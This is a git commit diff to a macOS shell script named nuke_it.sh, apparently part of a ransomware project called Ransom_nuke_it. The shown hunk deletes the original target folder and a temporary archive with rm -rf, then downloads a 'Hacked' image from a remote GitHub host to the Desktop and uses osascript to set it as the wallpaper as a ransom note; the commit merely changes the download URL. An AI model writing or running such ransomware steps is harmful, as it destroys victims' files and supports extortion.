7e2b9d7883f2f1a6222a13ba99176caf1cead5b7
sectorxatwork <82974341+sectorxatwork@users.noreply.github.com>
2025-05-29 15:18:13 +0530

    Update nuke_it.sh

--- nuke_it.sh
+++ nuke_it.sh
@@ -52,7 +52,7 @@ echo "   Removing original folder and temporary archive ..."
 rm -rf "$TARGET" "$ARCHIVE"
 
 # ---- 6. Drop ransom note and update wallpaper-----------------------------------------------------
-curl -o ~/Desktop/Hacked.jpg https://github.com/sectorxatwork/Ransom_nuke_it/raw/refs/heads/main/Hacked3.png
+curl -o ~/Desktop/Hacked.jpg https://raw.githubusercontent.com/sectorxatwork/Ransom_nuke_it/refs/heads/main/Hacked3.png
 osascript -e 'tell application "System Events" to set picture of every desktop to "~/Desktop/Hacked.jpg"'
 
 
